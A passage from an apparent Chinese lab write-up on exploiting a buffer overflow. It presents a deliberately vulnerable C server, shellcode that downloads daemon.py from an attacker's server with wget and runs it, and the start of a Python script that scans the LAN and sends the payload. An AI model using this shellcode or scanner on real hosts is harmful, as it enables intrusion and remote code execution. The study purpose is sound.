&quot;inFe&quot;</span><br><span class="line">push &quot;.&#x2F;&#x2F;L&quot; ;文件名.&#x2F;&#x2F;LinFengLv.txt&#x3D;LinFengLv.txt</span><br><span class="line">mov ebx, esp ;文件名地址存入ebx</span><br><span class="line">xor eax,eax	</span><br><span class="line">mov al,05h ;open系统调用号</span><br><span class="line">int 80h</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;write系统调用，写文件&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push &quot;6&quot;</span><br><span class="line">push &quot;0007&quot;</span><br><span class="line">push &quot;3015&quot;</span><br><span class="line">push &quot;2017&quot; ;文件内容2017301500076</span><br><span class="line">mov ecx, esp ;文件内容地址存入ecx</span><br><span class="line"></span><br><span class="line">mov ebx,eax	 ;上一个系统调用获得的文件描述符</span><br><span class="line">xor edx,edx</span><br><span class="line">mov dl,0dh  ;edx中存入文件内容的长度</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,04h  ;write系统调用号</span><br><span class="line">int 80h</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;close系统调用，关闭文件描述符&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;（可以不要）</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,06h</span><br><span class="line">int 80h</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;exit系统调用退出&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;（可以不要）</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,01h</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-2-下载-daemon程序"><a href="#5-2-下载-daemon程序" class="headerlink" title="5.2 下载 daemon程序"></a>5.2 下载 daemon程序</h2><p>主要是利用了linux中的系统调用int 80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数,从 <code>/usr/include/asm/unistd.h</code>中可以看到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd.h | less总共有383条</span><br><span class="line">#define __NR_execve              11 &lt;---本次调用</span><br></pre></td></tr></table></figure>
+
+<p>在本shellcode中我们的操作：</p>
+<p>调用execve系统调用来执行命令行（从攻击方开启的apache服务器中下载daemon.py)：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/wget 192.168.30.131/f/daemon.py</span><br></pre></td></tr></table></figure>
+
+<p><strong>字节码和汇编代码如下，注释了</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">;################字节码#############</span><br><span class="line">;shellcode_daemon&#x3D;b&#39;\x31\xc0\xb0\xa0\x29\xc4\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2f\x2f\x2f\x64\x68\x33\x31\x2f\x66\x68\x33\x30\x2e\x31\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89\xe1\x31\xc0\x50\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80&#39;</span><br><span class="line">;################字节码#############</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;抬高栈顶指针esp避免影响代码&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xA0</span><br><span class="line">sub esp,eax</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;调用execve系统调用来执行命令行&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">;作用（下载daemon.py）：&#x2F;usr&#x2F;bin&#x2F;wget 192.168.30.131&#x2F;f&#x2F;daemon.py</span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">mov edx,eax ;首先是edx为0</span><br><span class="line">push &quot;n.py&quot;</span><br><span class="line">push &quot;aemo&quot;</span><br><span class="line">push &quot;&#x2F;&#x2F;&#x2F;d&quot;</span><br><span class="line">push &quot;31&#x2F;f&quot;</span><br><span class="line">push &quot;30.1&quot;</span><br><span class="line">push &quot;168.&quot;</span><br><span class="line">push &quot;192.&quot;	</span><br><span class="line">mov ecx,esp ;ecx为字符串192.168.30.131&#x2F;f&#x2F;daemon.py的地址</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">push 0x74 ;t</span><br><span class="line">push 0x6567772f ;egw&#x2F;</span><br><span class="line">push 0x6e69622f ;nib&#x2F;</span><br><span class="line">push 0x7273752f ;rsu&#x2F;</span><br><span class="line">mov ebx,esp ;ebx是执行程序&#x2F;usr&#x2F;bin&#x2F;wget的地址</span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br><span class="line">mov ecx,esp ;ecx是ebx、ecx、edx三个execve参数的地址</span><br><span class="line">mov al,0bh ;eax是execve系统调用号0bh</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-3-运行daemon程序"><a href="#5-3-运行daemon程序" class="headerlink" title="5.3 运行daemon程序"></a>5.3 运行daemon程序</h2><p>主要是利用了linux中的系统调用int 80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数,从 <code>/usr/include/asm/unistd.h</code>中可以看到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd.h | less总共有383条</span><br><span class="line">#define __NR_execve              11 &lt;---本次调用</span><br></pre></td></tr></table></figure>
+
+<p>在本shellcode中我们的操作：</p>
+<p>调用execve系统调用来执行命令行（执行daemon.py）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python daemon.py</span><br></pre></td></tr></table></figure>
+
+<p><strong>字节码和汇编代码如下，注释了</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">;################字节码#############</span><br><span class="line">;shellcode_execdaemon&#x3D;b&#39;\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2e\x2f\x2f\x64\x89\xe1\x31\xc0\x50\x68\x74\x68\x6f\x6e\x68\x2f\x2f\x70\x79\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80&#39;</span><br><span class="line">;################字节码#############</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;抬高栈顶指针esp避免影响代码&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xA0</span><br><span class="line">sub esp,eax</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;调用execve系统调用来执行命令行&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">;作用（运行daemon.py）：&#x2F;usr&#x2F;bin&#x2F;python daemon.py</span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">mov edx,eax ;首先是edx为0</span><br><span class="line">push &quot;n.py&quot;</span><br><span class="line">push &quot;aemo&quot;</span><br><span class="line">push &quot;.&#x2F;&#x2F;d&quot;	</span><br><span class="line">mov ecx,esp ;ecx为字符串daemon.py的地址</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">push &quot;thon&quot;</span><br><span class="line">push &quot;&#x2F;&#x2F;py&quot;</span><br><span class="line">push &quot;&#x2F;bin&quot;</span><br><span class="line">push &quot;&#x2F;usr&quot;</span><br><span class="line">mov ebx,esp ;ebx是执行程序&#x2F;usr&#x2F;bin&#x2F;python的地址</span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br><span class="line">mov ecx,esp ;ecx是ebx、ecx、edx三个execve参数的地址</span><br><span class="line">mov al,0bh ;eax是execve系统调用号0bh</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<h1 id="六、任务二、三总体代码"><a href="#六、任务二、三总体代码" class="headerlink" title="六、任务二、三总体代码"></a>六、任务二、三总体代码</h1><h2 id="6-1-字符串翻转服务端程序-server-c"><a href="#6-1-字符串翻转服务端程序-server-c" class="headerlink" title="6.1 字符串翻转服务端程序 server.c"></a>6.1 字符串翻转服务端程序 server.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 8000</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str); <span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//逆转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	foo(str);</span><br><span class="line">	<span class="keyword">int</span> ilen = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="keyword">char</span>* p = str + ilen - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> itemp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(str &lt; p)&#123;</span><br><span class="line">		itemp = *p;</span><br><span class="line">		*p = *str;</span><br><span class="line">		*str = itemp;</span><br><span class="line">		p--;</span><br><span class="line">		str++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sfd, cfd;</span><br><span class="line">    <span class="keyword">int</span> i, len;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>], client_ip[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">socklen_t</span> addr_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//AF_INET:ipv4   SOCK_STREAM:流协议   0:默认协议(tcp,udp)</span></span><br><span class="line">    sfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定前先构造出服务器地址</span></span><br><span class="line">    bzero(&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    <span class="comment">//网络字节序</span></span><br><span class="line">    serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">    <span class="comment">//INADDR_ANY主机所有ip</span></span><br><span class="line">    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">    bind(sfd, (struct sockaddr *)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务器能接收并发链接的能力</span></span><br><span class="line">    <span class="built_in">listen</span>(sfd, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"wait for connect ...\n"</span>);</span><br><span class="line">    addr_len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    <span class="comment">//阻塞，等待客户端链接，成功则返回新的文件描述符，用于和客户端通信</span></span><br><span class="line">	<span class="comment">// 参数1是sfd; 参2传出参数, 参3传入传入参数, 全部是client端的参数</span></span><br><span class="line">    cfd = accept(sfd, (struct sockaddr *)&amp;client_addr, &amp;addr_len);</span><br><span class="line">	<span class="comment">// 打印链接的客户端地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"client IP:%s\t%d\n"</span>, </span><br><span class="line">            inet_ntop(AF_INET, &amp;client_addr.sin_addr.s_addr, client_ip,<span class="keyword">sizeof</span>(client_ip)),ntohs(client_addr.sin_port));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//阻塞接收客户端数据</span></span><br><span class="line">        len = <span class="built_in">read</span>(cfd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">		<span class="comment">// 将客户端发送的数据输出到屏幕中</span></span><br><span class="line">        <span class="built_in">write</span>(STDOUT_FILENO, buf, len);</span><br><span class="line">		reverse(buf);</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//返回给客户端结果</span></span><br><span class="line">        <span class="built_in">write</span>(cfd, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(cfd);</span><br><span class="line">    <span class="built_in">close</span>(sfd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-2-恶意客户端程序-attack-py"><a href="#6-2-恶意客户端程序-attack-py" class="headerlink" title="6.2 恶意客户端程序 attack.py"></a>6.2 恶意客户端程序 attack.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="comment"># 创建接收路由列表</span></span><br><span class="line"></span><br><span class="line">shellcode_createtxt=<span class="string">b'\x31\xc0\xb0\xa0\x29\xc4\x31\xd2\x31\xc9\x66\xba\xff\x01\x66\xb9\x41\x06\x31\xdb\x53\x68\x2e\x74\x78\x74\x68\x6e\x67\x4c\x76\x68\x69\x6e\x46\x65\x68\x2e\x2f\x2f\x4c\x89\xe3\x31\xc0\xb0\x05\xcd\x80\x31\xdb\x53\x6a\x36\x68\x30\x30\x30\x37\x68\x33\x30\x31\x35\x68\x32\x30\x31\x37\x89\xe1\x89\xc3\x31\xd2\xb2\x0d\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x31\xc0\xb0\x01\xcd\x80'</span></span><br><span class="line">shellcode_daemon=<span class="string">b'\x31\xc0\xb0\xa0\x29\xc4\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2f\x2f\x2f\x64\x68\x33\x31\x2f\x66\x68\x33\x30\x2e\x31\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89\xe1\x31\xc0\x50\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80'</span></span><br><span class="line">shellcode_execdaemon=<span class="string">b'\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2e\x2f\x2f\x64\x89\xe1\x31\xc0\x50\x68\x74\x68\x6f\x6e\x68\x2f\x2f\x70\x79\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建互斥锁</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"><span class="comment"># 设置需要扫描的端口号列表</span></span><br><span class="line">port_list = [<span class="string">"8000"</span>]</span><br><span class="line"><span class="comment"># routers = []</span></span><br><span class="line">routers = [[<span class="string">"192.168.30.133"</span>,<span class="string">"8000"</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#获得本机ip</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_host_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        s.connect((<span class="string">'8.8.8.8'</span>, <span class="number">80</span>))</span><br><span class="line">        ip = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义查询路由函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_routers</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 获取本地ip地址</span></span><br><span class="line">    ip=get_host_ip()</span><br><span class="line">    <span class="comment"># 存放线程列表池</span></span><br><span class="line">    all_threads = []</span><br><span class="line">    <span class="comment"># 循环本地网卡IP列表</span></span><br><span class="line">    print(str())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="comment"># 把网卡IP"."进行分割,生成每一个可用地址的列表</span></span><br><span class="line">        array = ip.split(<span class="string">'.'</span>)</span><br><span class="line">        <span class="comment"># 获取分割后的第四位数字，生成该网段所有可用IP地址</span></span><br><span class="line">        array[<span class="number">3</span>] = str(i)</span><br><span class="line">        <span class="comment"># 把分割后的每一可用地址列表，用"."连接起来，生成新的ip</span></span><br><span class="line">        new_ip = <span class="string">'.'</span>.join(array)</span><br><span class="line">        <span class="comment">#print(new_ip)</span></span><br><span class="line">        <span class="comment"># 遍历需要扫描的端口号列表</span></span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> port_list:</span><br><span class="line">            dst_port = int(port)</span><br><span class="line">            <span class="comment"># 循环创建线程去链接该地址</span></span><br><span class="line">            t = threading.Thread(target=check_ip, args=(new_ip, dst_port))</span><br><span class="line">            t.start()</span><br><span class="line">            <span class="comment"># 把新建的线程放到线程池</span></span><br><span class="line">            all_threads.append(t)</span><br><span class="line">    <span class="comment"># 循环阻塞主线程，等待每一字子线程执行完，程序再退出</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> all_threads:</span><br><span class="line">        t.join()</span><br><span class="line">    print(routers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建访问IP列表方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span><span class="params">(new_ip, port)</span>:</span></span><br><span class="line">    <span class="comment"># 创建TCP套接字，链接新的ip列表</span></span><br><span class="line">    scan_link = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment"># 设置链接超时时间</span></span><br><span class="line">    scan_link.settimeout(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 链接地址(通过指定我们 构造的主机地址，和扫描指定端口)</span></span><br><span class="line">    result = scan_link.connect_ex((new_ip, port))</span><br><span class="line">    <span class="comment"># input_data = b"\x90" * (120)</span></span><br><span class="line">    <span class="comment"># scan_link.send(input_data)  # 使服务器错误爆炸退出</span></span><br><span class="line">    scan_link.close()</span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line">    <span class="comment"># 判断链接结果</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 加锁</span></span><br><span class="line">        lock.acquire()</span><br><span class="line">        print(new_ip, <span class="string">'\t\t端口号%s开放'</span> % port)</span><br><span class="line">        routers.append((new_ip, port))</span><br><span class="line">        <span class="comment"># 释放锁</span></span><br><span class="line">        lock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comm_or_attack</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> route <span class="keyword">in</span> routers:</span><br><span class="line">        attack_a = input(<span class="string">"是否攻击/通信"</span>+route[<span class="number">0</span>]+route[<span class="number">1</span>]+<span class="string">"？(y/n):"</span>)</span><br><span class="line">        <span class="keyword">if</span> attack_a==<span class="string">"y"</span>: <span class="comment">#是否对该ip进行攻击/通信</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                    <span class="keyword">if</span> (clientsocket.connect((route[<span class="number">0</span>], int(route[<span class="number">1</span>]))) != <span class="number">0</span>):</span><br><span class="line">                        tans(clientsocket)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(<span class="string">"此轮clientsocket出错"</span>)</span><br><span class="line">                <span class="comment"># 